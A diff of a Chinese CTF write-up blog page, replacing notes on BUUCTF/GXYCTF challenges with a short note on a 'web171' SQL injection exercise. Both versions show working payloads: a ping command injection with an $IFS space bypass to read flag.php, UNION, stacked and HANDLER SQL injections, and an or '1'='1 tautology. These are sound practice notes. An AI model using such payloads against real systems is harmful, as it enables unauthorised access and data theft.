@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF-GXYCTF做题笔记, Chenluo">
+    <meta name="keywords" content="Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF-GXYCTF做题笔记 | Chenluo</title>
+    <title>Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF-GXYCTF做题笔记</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -443,13 +443,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/BUUCTF/">
-                                <span class="chip bg-color">BUUCTF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -461,7 +457,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-02
+                    2021-06-18
                 </div>
                 
 
@@ -470,7 +466,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    240
+                    69
                 </div>
                 
 
@@ -490,62 +486,22 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-执行命令"><a href="#1-执行命令" class="headerlink" title="1 执行命令"></a>1 执行命令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token number">1.1</span>.1.1<span class="token punctuation">;</span><span class="token function">ls</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="2-打开文件"><a href="#2-打开文件" class="headerlink" title="2. 打开文件"></a>2. 打开文件</h3><ul>
-<li>过滤了空格,以及一些其他方式</li>
+                <h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><ul>
+<li>根据提示的查询语句</li>
 </ul>
-<p>在网上搜一下替换空格的字符：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921596/article/details/86638919">https://blog.csdn.net/weixin_43921596/article/details/86638919</a></p>
-<p>利用<code>$IFS$9</code>,绕过空格</p>
-<p>先看一下，index.php</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3r17v3qij30t60dcwg5.jpg" alt="image-20210602111338588"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm6u5707kj30nu04v0t3.jpg" alt="image-20210618100034235"></p>
 <ul>
-<li>第一部分说明，只要f,l,a,g,按这四个顺序出现，就会被die，</li>
-<li>有个变量$a,执行shell_exec,执行ip的内容</li>
+<li>考虑直接闭合，并且使<code>where</code>语句为1，即可查出表中的所有内容</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3r3f08w9j30iv04idg7.jpg" alt="image-20210602111546244"></p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h3><p>在<code>bash</code>上尝试</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3rfer9llj30e205hwf4.jpg" alt="image-20210602112717450"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://f0b98762-01eb-49f2-8671-6e2a761ef213.node3.buuoj.cn/?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span><span class="token punctuation">;</span><span class="token assign-left variable">l</span><span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9fla</span><span class="token variable">$l</span>.php<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3rby1ru4j30if04ewex.jpg" alt="image-20210602112357442"></p>
-<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1 抓包"></a>1 抓包</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3vl3bkl6j60z005ojsr02.jpg" alt="image-20210602135105599"></p>
-<h3 id="2-base32解密"><a href="#2-base32解密" class="headerlink" title="2. base32解密"></a>2. base32解密</h3><pre class="line-numbers language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3vme4i3vj30tp07vjs6.jpg" alt="image-20210602135222964"></p>
-<h3 id="3-base64解密"><a href="#3-base64解密" class="headerlink" title="3. base64解密"></a>3. base64解密</h3><pre class="line-numbers language-none"><code class="language-none">select * from user where username &#x3D; &#39;$name&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr3vnp41nmj30kb07fjs2.jpg" alt="image-20210602135337567"></p>
-<p>可以看到<code>sql</code>语句格式</p>
-<p>根据<code>select</code>语句的特性</p>
-<p>在<code>union select</code>的时候遇到不存在的内容，就在数据库中添加该字段。。。</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 0,'</span>admin<span class="token string">','</span>e10adc3949ba59abbe56e057f20f883e'<span class="token comment">#</span>
-
-<span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr43pg1lo7j30rg04y0tk.jpg" alt="image-20210602183207481"></p>
-<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><ul>
-<li>查表</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr43uolga9j30s503i0t1.jpg" alt="image-20210602183709433"></p>
-<h3 id="1-尝试堆叠注入"><a href="#1-尝试堆叠注入" class="headerlink" title="1. 尝试堆叠注入"></a>1. 尝试堆叠注入</h3><ul>
-<li>查库，查表</li>
-</ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token keyword">from</span> supersqli<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr43vpbpxyj30fe0c1t9c.jpg" alt="image-20210602183808045"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm6yb86kkj30fs03gdg0.jpg" alt="image-20210618100436488"></p>
+<p><strong>利用<code>or </code>对于<code>where</code>语句无论<code>id</code>为多少，都会把所有的结果显示出来</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm70s8zplj309q03omxb.jpg" alt="image-20210618100659350"></p>
 <ul>
-<li>hander查询</li>
+<li>payload:</li>
 </ul>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">open</span><span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span> <span class="token keyword">handler</span> FlagHere <span class="token keyword">close</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">55&#39; or &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr442tutlfj60kh086aak02.jpg" alt="image-20210602184459675"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grm70d7uasj30vn03tmxi.jpg" alt="image-20210618100635516"></p>
 
                 
             </div>
@@ -572,7 +528,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/06/02/775.html">http://echo-machile.github.io/2021/06/02/775.html</a>
+                    <a href="http://echo-machile.github.io/2021/06/18/0.html">http://echo-machile.github.io/2021/06/18/0.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -609,11 +565,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/BUUCTF/">
-                                    <span class="chip bg-color">BUUCTF</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1065,62 +1017,18 @@ document.body.addEventListener('click', function(e) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/06/03/7766.html">
+                <a href="/2021/06/18/0.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="BUUCTF-SUCTF做题笔记">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">BUUCTF-SUCTF做题笔记</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            尘落
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/06/02/7890.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="BUUCTF-ZJCTF做题笔记">
-                        
-                        <span class="card-title">BUUCTF-ZJCTF做题笔记</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1131,7 +1039,45 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            尘落
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/06/12/867.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="n1book-web入门">
+                        
+                        <span class="card-title">n1book-web入门</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-12
                             </span>
                         <span class="publish-author">
                             
@@ -1144,8 +1090,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/ctf-web/">
+                        <span class="chip bg-color">ctf-web</span>
                     </a>
                     
                 </div>
